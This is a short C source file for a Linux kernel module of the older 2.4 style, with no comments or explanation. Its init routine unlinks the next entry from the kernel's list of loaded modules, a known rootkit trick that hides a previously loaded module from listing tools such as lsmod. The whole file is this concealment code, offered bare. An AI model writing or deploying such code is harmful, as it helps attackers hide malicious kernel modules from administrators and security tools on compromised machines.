#define __KERNEL__
#define MODULE

#include <linux/module.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
EXPORT_NO_SYMBOLS;

int init_module(void)
{
  struct module *p = THIS_MODULE;
  p->next = (p->next)->next;
  return 0;
}

void cleanup_module(void) {}
